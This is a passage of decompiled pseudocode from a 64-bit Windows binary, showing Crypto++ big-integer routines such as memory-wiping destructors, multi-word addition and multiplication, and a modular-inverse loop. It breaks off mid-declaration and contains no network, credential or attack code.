  if ( a1[2] < a1[3] )
    v4 = 2i64;
  v5 = (void *)a1[4];
  if ( v5 )
  {
    memset(v5, 0, 8i64 * a1[v4]);
    sub_13F12E4D0((__int64)v5);
  }
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 48i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1143A0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1143A0(_QWORD *a1, char a2)
{
  __int64 v4; // rdi
  void *v5; // r8

  v4 = 4i64;
  if ( a1[3] < a1[4] )
    v4 = 3i64;
  v5 = (void *)a1[5];
  if ( v5 )
  {
    memset(v5, 0, a1[v4]);
    sub_13F12E550(v5);
  }
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 48i64);
  return a1;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F114420) ----------------------------------------------------
_QWORD *__fastcall sub_13F114420(_QWORD *a1, char a2)
{
  sub_13F113380(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 168i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F114460) ----------------------------------------------------
_QWORD *__fastcall sub_13F114460(_QWORD *a1, char a2)
{
  sub_13F113450(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 248i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1144A0) ----------------------------------------------------
__int64 __fastcall sub_13F1144A0(__int64 a1, __int64 a2, __int64 a3)
{
  return sub_13F113F60(a2, a3);
}

//----- (000000013F1144B0) ----------------------------------------------------
__int64 __fastcall sub_13F1144B0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rcx
  __int64 v6; // rax
  __int64 v7; // rcx
  __int64 v8; // rdx
  unsigned __int64 *v9; // rax
  __int64 v10; // r9
  unsigned __int64 v11; // rdx
  __int64 result; // rax
  int v13; // eax
  __int64 v14; // rdi
  int v15; // eax
  int v16; // eax
  __int64 v17; // r8
  __int64 v18; // rdx

  v5 = *(_QWORD *)(a2 + 24);
  v6 = *(_QWORD *)(a1 + 48);
  if ( v5 != v6 || *(_QWORD *)(a3 + 24) != v6 )
  {
    sub_13F113F60(a2, a3);
    v13 = *(_DWORD *)(a1 + 64);
    v14 = a1 + 24;
    if ( *(_DWORD *)(a2 + 40) == 1 )
    {
      if ( v13 != 1 )
        return a2;
      v15 = -(int)sub_13F121140(a2, v14);
    }
    else
    {
      if ( v13 == 1 )
      {
LABEL_16:
        sub_13F11C2E0((_QWORD *)(a2 + 8), *(_QWORD *)(v14 + 24));
        v16 = *(_DWORD *)(v14 + 40);
        if ( *(_DWORD *)(a2 + 40) == 1 )
        {
          if ( v16 != 1 )
          {
            sub_13F120FA0(a2, a2, v14);
            result = a2;
            *(_DWORD *)(a2 + 40) = 1;
            return result;
          }
          v17 = a2;
          v18 = v14;
        }
        else
        {
          v17 = v14;
          v18 = a2;
          if ( v16 == 1 )
          {
            sub_13F120FA0(a2, a2, v14);
            return a2;
          }
        }
        sub_13F1213E0(a2, v18, v17);
        return a2;
      }
      v15 = sub_13F121140(a2, v14);
    }
    if ( v15 >= 0 )
      goto LABEL_16;
    return a2;
  }
  if ( !sub_13F13A4D0(v5, *(_QWORD *)(a2 + 32), *(_QWORD *)(a2 + 32), *(_QWORD *)(a3 + 32)) )
  {
    v7 = *(_QWORD *)(a2 + 24);
    v8 = *(_QWORD *)(a1 + 56);
    if ( v7 )
    {
      v9 = (unsigned __int64 *)(v8 + 8 * v7);
      v10 = *(_QWORD *)(a2 + 32) - v8;
      do
      {
        v11 = *(unsigned __int64 *)((char *)v9-- + v10 - 8);
        --v7;
        if ( v11 > *v9 )
          break;
        if ( v11 < *v9 )
          return a2;
      }
      while ( v7 );
    }
  }
  sub_13F13A520(*(_QWORD *)(a2 + 24), *(_QWORD *)(a2 + 32), *(_QWORD *)(a2 + 32), *(_QWORD *)(a1 + 56));
  return a2;
}

//----- (000000013F114600) ----------------------------------------------------
__int64 __fastcall sub_13F114600(__int64 a1, __int64 a2)
{
  __int64 v3; // rax

  v3 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 120i64))(*(_QWORD *)(a1 + 8));
  return sub_13F113500(a2, v3);
}

//----- (000000013F114630) ----------------------------------------------------
__int64 __fastcall sub_13F114630(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  __int64 v5; // rbx
  unsigned __int64 v6; // rcx
  __int64 v7; // rdx
  char v8[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v9; // [rsp+38h] [rbp-30h]
  unsigned __int64 v10; // [rsp+40h] [rbp-28h]
  void *v11; // [rsp+48h] [rbp-20h]

  sub_13F120ED0(a2, (__int64)v8, a3);
  result = sub_13F113500(a1 + 72, (__int64)v8);
  v5 = result;
  v6 = v10;
  if ( v9 < v10 )
    v6 = v9;
  v7 = (__int64)v11;
  if ( v11 )
  {
    memset(v11, 0, 8 * v6);
    sub_13F12E4D0(v7);
    return v5;
  }
  return result;
}

//----- (000000013F1146B0) ----------------------------------------------------
__int64 __fastcall sub_13F1146B0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rcx
  __int64 v6; // rax
  __int64 v7; // rdx
  __int64 v8; // rcx
  unsigned __int64 *v9; // rax
  __int64 v10; // r8
  unsigned __int64 v11; // rdx
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  int v15; // eax
  __int64 v16; // rcx
  __int64 v17; // r8
  __int64 v18; // rdx
  char v19[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v20; // [rsp+38h] [rbp-30h]
  unsigned __int64 v21; // [rsp+40h] [rbp-28h]
  void *v22; // [rsp+48h] [rbp-20h]

  v5 = *(_QWORD *)(a2 + 24);
  v6 = *(_QWORD *)(a1 + 48);
  if ( v5 != v6 || *(_QWORD *)(a3 + 24) != v6 )
  {
    sub_13F120ED0(a2, (__int64)v19, a3);
    sub_13F113500(a1 + 120, (__int64)v19);
    v13 = v21;
    if ( v20 < v21 )
      v13 = v20;
    v14 = (__int64)v22;
    if ( v22 )
    {
      memset(v22, 0, 8 * v13);
      sub_13F12E4D0(v14);
    }
    if ( *(_DWORD *)(a1 + 160) == 1 )
    {
      if ( *(_DWORD *)(a1 + 64) != 1 )
        return a1 + 120;
      v15 = -(int)sub_13F121140(a1 + 120, a1 + 24);
    }
    else
    {
      if ( *(_DWORD *)(a1 + 64) == 1 )
        goto LABEL_21;
      v15 = sub_13F121140(a1 + 120, a1 + 24);
    }
    if ( v15 >= 0 )
    {
LABEL_21:
      sub_13F11C2E0((_QWORD *)(a1 + 128), *(_QWORD *)(a1 + 48));
      v16 = a1 + 120;
      if ( *(_DWORD *)(a1 + 160) == 1 )
      {
        if ( *(_DWORD *)(a1 + 64) != 1 )
        {
          sub_13F120FA0(v16, a1 + 120, a1 + 24);
          *(_DWORD *)(a1 + 160) = 1;
          return a1 + 120;
        }
        v17 = a1 + 120;
        v18 = a1 + 24;
      }
      else
      {
        v17 = a1 + 24;
        v18 = a1 + 120;
        if ( *(_DWORD *)(a1 + 64) == 1 )
        {
          sub_13F120FA0(v16, v18, v17);
          return a1 + 120;
        }
      }
      sub_13F1213E0(v16, v18, v17);
    }
    return a1 + 120;
  }
  if ( !sub_13F13A4D0(v5, *(_QWORD *)(a1 + 104), *(_QWORD *)(a2 + 32), *(_QWORD *)(a3 + 32)) )
  {
    v7 = *(_QWORD *)(a1 + 56);
    v8 = *(_QWORD *)(a2 + 24);
    if ( v8 )
    {
      v9 = (unsigned __int64 *)(v7 + 8 * v8);
      v10 = *(_QWORD *)(a1 + 104) - v7;
      do
      {
        --v8;
        v11 = *(unsigned __int64 *)((char *)--v9 + v10);
        if ( v11 > *v9 )
          break;
        if ( v11 < *v9 )
          return a1 + 72;
      }
      while ( v8 );
    }
  }
  sub_13F13A520(*(_QWORD *)(a2 + 24), *(_QWORD *)(a1 + 104), *(_QWORD *)(a1 + 104), *(_QWORD *)(a1 + 56));
  return a1 + 72;
}

//----- (000000013F114840) ----------------------------------------------------
__int64 __fastcall sub_13F114840(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 120i64))(*(_QWORD *)(a1 + 8));
}

//----- (000000013F114850) ----------------------------------------------------
__int64 __fastcall sub_13F114850(
        __m128i *a1,
        __m128i *a2,
        const __m128i *a3,
        __int64 a4,
        const __m128i *a5,
        unsigned __int64 a6)
{
  __m128i *v6; // r12
  unsigned __int64 v7; // rsi
  unsigned __int64 v8; // rbx
  __m128i *v9; // r14
  __m128i *v10; // r10
  unsigned __int64 v11; // r13
  __int8 *v12; // r15
  __int64 *v13; // rax
  unsigned int v14; // ebp
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // r8
  __int64 *v17; // rax
  unsigned __int64 v18; // rdx
  unsigned __int64 v19; // rcx
  char *v20; // rdx
  unsigned __int64 v21; // rdi
  __int64 v22; // r9
  unsigned __int64 v23; // rcx
  __int64 *v24; // rax
  __int64 v25; // r8
  unsigned __int64 v26; // r10
  __int64 *v27; // rdi
  unsigned __int64 v28; // rdx
  __int64 v29; // rax
  unsigned __int64 v30; // rdi
  unsigned __int64 i; // r8
  __int64 v32; // rax
  unsigned __int64 v33; // rdi
  unsigned __int64 v34; // rcx
  __int64 v35; // rsi
  __int8 *v36; // rax
  signed __int64 v37; // r8
  unsigned __int64 v38; // rdx
  int v39; // eax
  bool v40; // zf
  __int64 v41; // rax
  __int64 v42; // r9
  __int64 v43; // rcx
  __int64 v44; // rax
  BOOL v45; // eax
  char v48; // [rsp+68h] [rbp+10h]
  __m128i *v49; // [rsp+70h] [rbp+18h]

  v6 = a2;
  v7 = 2i64;
  v8 = a6;
  v9 = &a2[a6];
  v10 = (__m128i *)((char *)a2 + 24 * a6);
  v49 = v10;
  v11 = 8 * a6;
  v12 = &a2->m128i_i8[8 * a6];
  if ( a6 )
  {
    v13 = &a5[-1].m128i_i64[v11 / 8 + 1];
    do
    {
      if ( *(v13 - 1) )
        break;
      if ( *v13 )
        break;
      v13 -= 2;
      v8 -= 2i64;
    }
    while ( v8 );
  }
  v14 = 0;
  v48 = 0;
  if ( 3 * a6 )
    memset(a2, 0, 24 * a6);
  a2->m128i_i64[0] = 1i64;
  if ( v9 != a3 )
  {
    sub_13F10D330(v9, 8 * a4, a3, 8 * a4);
    v10 = v49;
  }
  if ( v10 != a5 )
    sub_13F10D330(v10, v11, a5, v11);
  while ( 1 )
  {
    v15 = v9->m128i_i64[0];
    if ( !v9->m128i_i64[0] )
      break;
LABEL_25:
    _BitScanForward64((unsigned __int64 *)&v22, v15);
    v14 += v22;
    if ( v15 >> v22 == 1 && !v9->m128i_i64[1] )
    {
      v23 = v8 - 2;
      if ( v8 == 2 )
      {
LABEL_32:
        if ( v48 )
        {
          sub_13F13A520(a6, (__int64)a1, (__int64)a5, (__int64)v6);
        }
        else if ( a1 != v6 )
        {
          sub_13F10D330(a1, v11, v6, v11);
        }
        return v14;
      }
      v24 = &v9->m128i_i64[v23 + 1];
      while ( !*(v24 - 1) && !*v24 )
      {
        v24 -= 2;
        v23 -= 2i64;
        if ( !v23 )
          goto LABEL_32;
      }
    }
    v25 = 0i64;
    if ( (_DWORD)v22 )
    {
      v26 = v8;
      if ( v8 )
      {
        v27 = &v9->m128i_i64[v8 - 1];
        do
        {
          v28 = *v27--;
          v29 = v25 | (v28 >> v22);
          v25 = v28 << (64 - (unsigned __int8)v22);
          v27[1] = v29;
          --v26;
        }
        while ( v26 );
      }
    }
    v30 = 0i64;
    if ( (_DWORD)v22 )
    {
      for ( i = 0i64; i < v7; v30 = v33 >> (64 - (unsigned __int8)v22) )
      {
        v32 = v30 | (*(_QWORD *)&v12[8 * i] << v22);
        v33 = *(_QWORD *)&v12[8 * i];
        *(_QWORD *)&v12[8 * i++] = v32;
      }
    }
    *(_QWORD *)&v12[8 * v7] += v30;
    v34 = v8;
    v35 = (v30 != 0 ? 2 : 0) + v7;
    if ( v8 )
    {
      v36 = &v9->m128i_i8[8 * v8];
      v37 = (char *)v49 - (char *)v9;
      while ( 1 )
      {
        v38 = *((_QWORD *)v36 - 1);
        v36 -= 8;
        --v34;
        if ( v38 > *(_QWORD *)&v36[v37] )
          break;
        if ( v38 < *(_QWORD *)&v36[v37] )
        {
          v39 = -1;
          goto LABEL_47;
        }
        if ( !v34 )
          goto LABEL_46;
      }
      v39 = 1;
    }
    else
    {
LABEL_46:
      v39 = 0;
    }
LABEL_47:
    v40 = v39 == -1;
    v48 ^= v40;
    v41 = 8 * v40 * (((char *)v9 - (char *)v49) >> 3);
    v9 = (__m128i *)((char *)v9 - v41);
    v42 = (__int64)&v49->m128i_i64[(unsigned __int64)v41 / 8];
    v49 = (__m128i *)((char *)v49 + v41);
    v43 = 0i64;
    v44 = 8 * v40 * (((char *)v6 - v12) >> 3);
    v6 = (__m128i *)((char *)v6 - v44);
    v12 += v44;
    if ( *(_OWORD *)((char *)&v9[-1] + 8 * v8) == 0i64 )
      v43 = 2i64;
    v8 -= v43;
    sub_13F13A520(v8, (__int64)v9, (__int64)v9, v42);
    v45 = sub_13F13A4D0(v35, (__int64)v6, (__int64)v6, (__int64)v12);
    v6->m128i_i64[v35] += v45;
    v7 = v35 + 2i64 * v45;
  }
  while ( sub_13F11D820((__int64)v9, v8) )
  {
    v16 = v8 != 0;
    if ( v8 )
    {
      if ( v16 < v8 )
      {
        v17 = (__int64 *)v9;
        v18 = v8 != 0;
        do
        {
          ++v18;
          *v17 = v17[v16];
          ++v17;
        }
        while ( v18 < v8 );
      }
      memset((char *)v9 + 8 * (v8 - v16), 0, 8 * v16);
    }
    v7 += *(_QWORD *)&v12[8 * v7 - 8] != 0i64 ? 2 : 0;
    v19 = v7 != 0;
    if ( v7 )
    {
      if ( v7 - 1 >= v19 )
      {
        v20 = &v12[8 * v7 - 8];
        v21 = v7 - v19;
        do
        {
          *(_QWORD *)v20 = *(_QWORD *)&v20[-8 * v19];
          v20 -= 8;
          --v21;
        }
        while ( v21 );
      }
      memset(v12, 0, 8 * v19);
    }
    v15 = v9->m128i_i64[0];
    v14 += 64;
    if ( v9->m128i_i64[0] )
      goto LABEL_25;
  }
  if ( a6 )
    memset(a1, 0, 8 * a6);
  return 0i64;
}
// 13F114981: conditional instruction was optimized away because r8.8==1
// 13F1149E4: conditional instruction was optimized away because rcx.8==1

//----- (000000013F114C40) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char __fastcall sub_13F114C40(__int64 a1, __int64 a2, int *a3)
{
  int v6; // esi
  __m128i *v7; // rax
  __m128i *v8; // rbx
  BOOL v9; // ebp
  __int64 *v10; // rcx
  __int64 v11; // rax
  __int64 v12; // rdx
  __m128i *v13; // rcx
  __int64 (__fastcall **v14)(); // [rsp+28h] [rbp-40h] BYREF
  char v15[8]; // [rsp+30h] [rbp-38h] BYREF
  __m128i si128; // [rsp+38h] [rbp-30h]
  __m128i *v17; // [rsp+48h] [rbp-20h]
  BOOL v18; // [rsp+50h] [rbp-18h]

  if ( (unsigned int)sub_13F15E52C(a1 + 8, (__int64)&qword_13F1BF2C8) )
    return 0;
  v6 = *a3;
  v14 = off_13F185278;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  v7 = (__m128i *)sub_13F123740((__int64)v15, 2ui64);
  v8 = v7;
  v17 = v7;
  v9 = v6 < 0;
  v18 = v9;
  if ( v6 < 0 )
    v6 = -v6;
  v7->m128i_i64[0] = v6;
  v10 = &v7->m128i_i64[1];
  v7->m128i_i64[1] = 0i64;
  if ( (__int64 (__fastcall ***)())a2 != &v14 )
  {
    v11 = 2i64;
    do
    {
      if ( *v10 )
        break;
      --v10;
      --v11;
    }
    while ( v11 );
    v12 = sub_13F122180((unsigned int)v11);
    sub_13F120E60((_QWORD *)(a2 + 8), v12);
    v13 = *(__m128i **)(a2 + 32);
    if ( v13 != v8 )
      sub_13F10D330(v13, 8i64 * *(_QWORD *)(a2 + 24), v8, 8i64 * *(_QWORD *)(a2 + 24));
    *(_DWORD *)(a2 + 40) = v9;
  }
  memset(v8, 0, sizeof(__m128i));
  sub_13F12E4D0((__int64)v8);
  return 1;
}
// 13F114C8D: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F1BF2C8: using guessed type __int64 qword_13F1BF2C8;
// 13F114C40: using guessed type char var_38[8];

//----- (000000013F114D80) ----------------------------------------------------
char __fastcall sub_13F114D80(__int64 a1, const __m128i *a2, __int64 a3, __int64 a4)
{
  int *v5; // rsi
  char result; // al

  v5 = (int *)(a1 + 32);
  if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF2C8, (__int64)&qword_13F1C3E50)
    || (result = sub_13F114C40(a3, a4, v5)) == 0 )
  {
    sub_13F101D10(a2, (__int64)&CryptoPP::Integer `RTTI Type Descriptor', a3);
    return sub_13F113500(a4, (__int64)v5);
  }
  return result;
}
// 13F1BF2C8: using guessed type __int64 qword_13F1BF2C8;
// 13F1C3E50: using guessed type __int64 qword_13F1C3E50;

//----- (000000013F114E00) ----------------------------------------------------
char __fastcall sub_13F114E00(__int64 a1, const __m128i *a2, __int64 a3, _DWORD *a4)
{
  int v8; // eax

  if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF2F0, (__int64)&qword_13F1C3E50)
    || (LOBYTE(v8) = sub_13F114C40(a3, (__int64)a4, (int *)(a1 + 32)), !(_BYTE)v8) )
  {
    sub_13F101D10(a2, (__int64)&enum CryptoPP::Integer::RandomNumberType `RTTI Type Descriptor', a3);
    v8 = *(_DWORD *)(a1 + 32);
    *a4 = v8;
  }
  return v8;
}
// 13F1BF2F0: using guessed type __int64 qword_13F1BF2F0;
// 13F1C3E50: using guessed type __int64 qword_13F1C3E50;

//----- (000000013F114E80) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F114E80(
        __m128i *a1,
        _QWORD *a2,
        unsigned __int64 *a3,
        unsigned __int64 a4,
        unsigned __int64 *a5,
        unsigned __int64 a6)
{
  unsigned __int64 v6; // rbx
  unsigned __int64 v7; // rdi
  unsigned __int64 *v8; // rsi
  __m128i *v10; // r12
  unsigned __int64 result; // rax
  __m128i *v12; // r13
  unsigned __int64 v13; // r9
  unsigned __int64 v14; // rcx
  unsigned int v15; // edi
  __int64 v16; // r8
  unsigned __int128 v17; // rax
  unsigned __int64 v18; // rdx
  __m128i *v19; // rbp
  __m128i *v20; // rcx
  unsigned __int64 *v21; // r15
  unsigned __int64 v22; // r12
  char *v23; // rax
  unsigned __int64 v24; // r15
  signed __int64 v25; // r13
  unsigned __int64 v26; // rbp
  __m128i *v27; // r15
  signed __int64 v28; // r13
  unsigned __int64 v29; // r15
  unsigned __int64 *v30; // rbp
  char *v31; // rax
  unsigned __int64 v32; // rcx
  __int64 *v33; // rdx
  __int64 v34; // rcx
  char *v36; // [rsp+30h] [rbp-48h]
  __int64 v38; // [rsp+98h] [rbp+20h]
  unsigned __int64 *v39; // [rsp+A8h] [rbp+30h]

  v6 = a6;
  v7 = a4;
  v8 = a3;
  v10 = a1;
  if ( a4 == a6 )
  {
    if ( a3 == a5 )
      return sub_13F121F90(a1, a2, a3, a4);
    else
      return sub_13F121B80(a1, a2, a3, a5, a4);
  }
  if ( a4 <= a6 )
  {
    v12 = (__m128i *)a5;
    v39 = a5;
  }
  else
  {
    v8 = a5;
    v7 = a6;
    v39 = a3;
    v6 = a4;
    v12 = (__m128i *)a3;
  }
  if ( v7 == 2 && !v8[1] )
  {
    v13 = *v8;
    result = *v8;
    if ( *v8 )
    {
      if ( result == 1 )
      {
        if ( a1 != v12 )
          result = sub_13F10D330(a1, 8 * v6, v12, 8 * v6);
        v10->m128i_i64[v6 + 1] = 0i64;
        v10->m128i_i64[v6] = 0i64;
      }
      else
      {
        v14 = 0i64;
        v15 = 0;
        if ( v6 )
        {
          v16 = 0i64;
          do
          {
            v17 = v12->m128i_u64[v16] * (unsigned __int128)v13;
            result = v14 + v17;
            v10->m128i_i64[v16] = result;
            v14 = (result < v14) + *((_QWORD *)&v17 + 1);
            v16 = ++v15;
          }
          while ( v15 < v6 );
        }
        v10->m128i_i64[v6] = v14;
        v10->m128i_i64[v6 + 1] = 0i64;
      }
    }
    else if ( v6 != -2i64 )
    {
      result = 0i64;
      memset(a1, 0, 8 * (v6 + 2));
    }
    return result;
  }
  if ( ((v6 / v7) & 1) != 0 )
  {
    v26 = 0i64;
    if ( v6 )
    {
      v27 = a1;
      v28 = (char *)v12 - (char *)a1;
      do
      {
        sub_13F121B80(v27, a2, v8, (unsigned __int64 *)((char *)v27->m128i_u64 + v28), v7);
        v26 += 2 * v7;
        v27 += v7;
      }
      while ( v26 < v6 );
      v10 = a1;
      v12 = (__m128i *)v39;
    }
    v29 = v7;
    if ( v7 >= v6 )
      goto LABEL_40;
    v30 = (unsigned __int64 *)v12 + v7;
    v31 = (char *)a2 + 8 * v7 - (_QWORD)v12;
    do
    {
      sub_13F121B80((unsigned __int64 *)((char *)v30 + (_QWORD)v31), a2, v8, v30, v7);
      v31 = (char *)a2 + 8 * v7 - (_QWORD)v12;
      v29 += 2 * v7;
      v30 += 2 * v7;
    }
    while ( v29 < v6 );
  }
  else
  {
    sub_13F121B80(a1, a2, v8, (unsigned __int64 *)v12, v7);
    v18 = 8 * v7;
    v19 = (__m128i *)((char *)v10 + 8 * v7);
    v38 = 16 * v7;
    v20 = (__m128i *)&a2[2 * v7];
    if ( v20 != v19 )
    {
      sub_13F10D330(v20, v18, (__m128i *)((char *)v10 + 8 * v7), 8 * v7);
      v18 = 8 * v7;
    }
    if ( 2 * v7 < v6 )
    {
      v21 = (unsigned __int64 *)&v12[v7];
      v22 = 2 * v7;
      v23 = (char *)a2 + v18 - (_QWORD)v12;
      v36 = v23;
      do
      {
        sub_13F121B80((unsigned __int64 *)((char *)v21 + (_QWORD)v23), a2, v8, v21, v7);
        v23 = v36;
        v22 += 2 * v7;
        v21 = (unsigned __int64 *)((char *)v21 + v38);
      }
      while ( v22 < v6 );
      v10 = a1;
      v12 = (__m128i *)v39;
    }
    v24 = v7;
    if ( v7 >= v6 )
      goto LABEL_40;
    v25 = (char *)v12 - (char *)v10;
    do
    {
      sub_13F121B80(v19, a2, v8, (unsigned __int64 *)((char *)v19->m128i_u64 + v25), v7);
      v24 += 2 * v7;
      v19 = (__m128i *)((char *)v19 + v38);
    }
    while ( v24 < v6 );
  }
  v10 = a1;
LABEL_40:
  result = sub_13F13A4D0(v6 - v7, (__int64)&v10->m128i_i64[v7], (__int64)&v10->m128i_i64[v7], (__int64)&a2[2 * v7]);
  if ( (_DWORD)result )
  {
    v32 = v10->m128i_u64[v6];
    v33 = &v10->m128i_i64[v6];
    result = v32 + 1;
    *v33 = v32 + 1;
    if ( v32 + 1 < v32 )
    {
      result = 1i64;
      if ( v7 > 1 )
      {
        v34 = 1i64;
        do
        {
          if ( v33[v34]++ != -1 )
            break;
          result = (unsigned int)(result + 1);
          v34 = (unsigned int)result;
        }
        while ( (unsigned int)result < v7 );
      }
    }
  }
  return result;
}

//----- (000000013F115220) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F115220(__int64 a1, __int64 a2))()
{
  unsigned __int64 v3; // rbx
  unsigned __int64 v4; // r8
  __int64 v6[6]; // [rsp+30h] [rbp-58h] BYREF
  unsigned __int64 v7; // [rsp+60h] [rbp-28h]
  char v8; // [rsp+69h] [rbp-1Fh]

  sub_13F10B1D0((__int64)v6, a2, 2);
  if ( !v8 || (v3 = v7, sub_13F1105F0(v6) < v3) )
    sub_13F10BF50();
  v4 = 0i64;
  if ( v8 )
    v4 = v7;
  sub_13F11C820(a1, (__int64)v6, v4, 1);
  sub_13F10D020((__int64)v6);
  return sub_13F10B560((__int64)v6);
}
// 13F115220: using guessed type __int64 var_58[6];

//----- (000000013F1152D0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F1152D0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // rcx
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // rax
  __int64 v11; // r9
  unsigned __int64 v12; // r9
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // r8
  unsigned __int64 v15; // rdi
  unsigned __int64 v16; // rbx
  unsigned __int64 v17; // rcx
  unsigned __int64 v18; // r11
  unsigned __int64 v19; // rax
  __int64 v20; // r10
  unsigned __int64 v21; // r10
  unsigned __int64 v22; // rcx
  unsigned __int64 v23; // r8
  unsigned __int64 v24; // r15
  unsigned __int64 v25; // r14
  unsigned __int64 v26; // rcx
  unsigned __int64 v27; // rbp
  unsigned __int64 v28; // r8
  unsigned __int64 v29; // rdi
  unsigned __int64 v30; // r10
  unsigned __int64 v31; // rax
  __int64 v32; // rbx
  unsigned __int64 v33; // rbx
  unsigned __int128 v34; // rax
  unsigned __int64 v35; // r11
  unsigned __int64 v36; // r8
  _BOOL8 v37; // r10
  unsigned __int128 v38; // rax
  unsigned __int64 v39; // r9
  unsigned __int64 v40; // rcx
  _BOOL8 v41; // r10
  unsigned __int128 v42; // rax
  unsigned __int64 v43; // r8
  unsigned __int64 v44; // r9
  _BOOL8 v45; // r10
  unsigned __int128 v46; // rax
  unsigned __int64 v47; // rcx
  unsigned __int64 v48; // r9
  _BOOL8 v49; // r10
  unsigned __int128 v50; // rax
  unsigned __int64 v51; // r9
  _BOOL8 v52; // r10
  unsigned __int128 v53; // rax
  unsigned __int64 v54; // rcx
  unsigned __int64 v55; // r10
  _BOOL8 v56; // r9
  unsigned __int128 v57; // rax
  unsigned __int64 v58; // r8
  unsigned __int64 v59; // r10
  _BOOL8 v60; // r9
  unsigned __int128 v61; // rax
  unsigned __int64 v62; // rcx
  unsigned __int64 v63; // r10
  _BOOL8 v64; // r9
  unsigned __int128 v65; // rax
  unsigned __int64 v66; // r8
  unsigned __int64 v67; // r10
  _BOOL8 v68; // r9
  unsigned __int128 v69; // rax
  unsigned __int64 v70; // rcx
  unsigned __int64 v71; // r10
  _BOOL8 v72; // r9
  unsigned __int128 v73; // rax
  unsigned __int64 v74; // r10
  _BOOL8 v75; // r9
  unsigned __int128 v76; // rax
  unsigned __int64 v77; // rcx
  unsigned __int64 v78; // r9
  _BOOL8 v79; // r10
  unsigned __int128 v80; // rax
  unsigned __int64 v81; // r8
  unsigned __int64 v82; // r9
  _BOOL8 v83; // r10
  unsigned __int128 v84; // rax
  unsigned __int64 v85; // rcx
  unsigned __int64 v86; // r9
  _BOOL8 v87; // r10
  unsigned __int128 v88; // rax
  unsigned __int64 v89; // r8
  unsigned __int64 v90; // r9
  _BOOL8 v91; // r10
  unsigned __int128 v92; // rax
  unsigned __int64 v93; // rcx
  unsigned __int64 v94; // r9
  _BOOL8 v95; // r10
  unsigned __int128 v96; // rax
  unsigned __int64 v97; // r8
  unsigned __int64 v98; // r9
  _BOOL8 v99; // r10
  unsigned __int128 v100; // rax
  unsigned __int64 v101; // r9
  _BOOL8 v102; // r10
  unsigned __int128 v103; // rax
  unsigned __int64 v104; // rcx
  unsigned __int64 v105; // r10
  _BOOL8 v106; // r9
  unsigned __int128 v107; // rax
  unsigned __int64 v108; // r8
  unsigned __int64 v109; // r10
  _BOOL8 v110; // r9
  unsigned __int128 v111; // rax
  unsigned __int64 v112; // rcx
  unsigned __int64 v113; // r10
  _BOOL8 v114; // r9
  unsigned __int128 v115; // rax
  unsigned __int64 v116; // r8
  unsigned __int64 v117; // r10
  _BOOL8 v118; // r9
  unsigned __int128 v119; // rax
  unsigned __int64 v120; // rcx
  unsigned __int64 v121; // r10
  _BOOL8 v122; // r9
  unsigned __int128 v123; // rax
  unsigned __int64 v124; // r8
  unsigned __int64 v125; // r10
  _BOOL8 v126; // r9
  unsigned __int128 v127; // rax
  unsigned __int64 v128; // rcx
  unsigned __int64 v129; // r10
  _BOOL8 v130; // r9
  unsigned __int128 v131; // rax
  unsigned __int64 v132; // r10
  _BOOL8 v133; // r9
  unsigned __int128 v134; // rax
  unsigned __int64 v135; // rcx
  unsigned __int64 v136; // r9
  _BOOL8 v137; // r10
  unsigned __int128 v138; // rax
  unsigned __int64 v139; // r8
  unsigned __int64 v140; // r9
  _BOOL8 v141; // r10
  unsigned __int128 v142; // rax
  unsigned __int64 v143; // rcx
  unsigned __int64 v144; // r9
  _BOOL8 v145; // r10
  unsigned __int128 v146; // rax
  unsigned __int64 v147; // r8
  unsigned __int64 v148; // r9
  _BOOL8 v149; // r10
  unsigned __int128 v150; // rax
  unsigned __int64 v151; // rcx
  unsigned __int64 v152; // r9
  _BOOL8 v153; // r10
  unsigned __int128 v154; // rax
  unsigned __int64 v155; // r8
  unsigned __int64 v156; // r9
  _BOOL8 v157; // r10
  unsigned __int128 v158; // rax
  unsigned __int64 v159; // rcx
  unsigned __int64 v160; // r9
  _BOOL8 v161; // r10
  unsigned __int128 v162; // rax
  unsigned __int64 v163; // r8
  unsigned __int64 v164; // r9
  _BOOL8 v165; // r10
  unsigned __int128 v166; // rax
  unsigned __int64 v167; // r9
  _BOOL8 v168; // r10
  unsigned __int128 v169; // rax
  unsigned __int64 v170; // rcx
  unsigned __int64 v171; // r10
  _BOOL8 v172; // r9
  unsigned __int128 v173; // rax
  unsigned __int64 v174; // r8
  unsigned __int64 v175; // r10
